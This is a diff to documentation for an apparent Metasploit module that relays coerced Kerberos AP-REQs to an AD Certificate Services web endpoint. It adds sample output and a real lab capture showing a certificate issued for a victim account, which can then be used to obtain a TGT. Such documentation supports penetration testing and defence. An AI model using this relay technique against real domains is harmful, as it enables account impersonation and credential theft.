@@ -249,21 +249,51 @@ Auxiliary action:
 
 Once the victim resolves the target service through the attacker and
 authenticates to the attacker's SMB server, the relay server extracts the
-AP-REQ, replays it to the CA, and saves the issued certificate. Representative
-output of a successful `run` (exact lines depend on the client and template):
+AP-REQ, replays it to the CA, and saves the issued certificate. Output of a
+successful `run` for the `AD\WIN-VICTIM$` example above:
 
 ```
-[*] New Kerberos request from 192.168.64.2
-[*] Received AP-REQ for coerced principal AD\WIN-VICTIM$
-[*] Relaying to next target http://ca.ad.example.com/certsrv/
-[+] Successfully authenticated against relay target http://ca.ad.example.com/certsrv/
-[*] Creating certificate request for WIN-VICTIM$ using the Machine template
-[*] Requesting relay target generate certificate...
-[+] Certificate for WIN-VICTIM$ using template Machine saved to ~/.msf4/loot/..._windows.ad.cs_....pfx
+[*] New request from 192.168.64.2
+[*] Relaying Kerberos AP-REQ to http://ca.ad.example.com/certsrv/
+[+] Successfully relayed Kerberos AP-REQ to http://ca.ad.example.com/certsrv/
+[*] Building a certificate signing request for user WIN-VICTIM$ - RSA key size: 2048 - digest algorithm: SHA256 - template: Machine
+[*] Submitting the certificate signing request to the target...
+[+] Certificate generated using template Machine for AD\WIN-VICTIM$
+[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=...&
+[*] Certificate stored at: ~/.msf4/loot/..._windows.ad.cs_....pfx
 ```
 
 The resulting `.pfx` can then be used with `auxiliary/admin/kerberos/get_ticket`
 (PKINIT) to obtain a TGT for the coerced account.
+
+### Real capture from a lab run
+
+The output above is reconstructed from the module's own log strings, so it
+lines up with the `AD\WIN-VICTIM$` example rather than requiring a specific
+account for every walkthrough. Here is an unedited capture from a real run
+against a live domain, using `RELAY_IDENTITY labuser@kerberos.issue` (the UPN
+form) with `MODE SPECIFIC_TEMPLATE` and `CERT_TEMPLATE User`, to also exercise
+the identity-format handling described under RELAY_IDENTITY above:
+
+```
+[*] New request from 192.168.64.3
+[*] Relaying Kerberos AP-REQ to http://192.168.64.3:80/certsrv/
+[+] Successfully relayed Kerberos AP-REQ to http://192.168.64.3:80/certsrv/
+[*] Building a certificate signing request for user labuser - RSA key size: 2048 - digest algorithm: SHA256 - template: User
+[*] Submitting the certificate signing request to the target...
+[+] Certificate generated using template User for kerberos.issue\labuser
+[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=28&
+[*] Certificate stored at: /root/.msf4/loot/20260819121714_default_192.168.64.3_windows.ad.cs_492865.pfx
+```
+
+The issued certificate, verified with `openssl`:
+
+```
+subject=DC=issue, DC=kerberos, CN=Users, CN=labuser
+issuer=DC=issue, DC=kerberos, CN=kerberos-DC1-CA
+X509v3 Subject Alternative Name:
+    othername: UPN:labuser@kerberos.issue
+```
 
 ## Notes
 
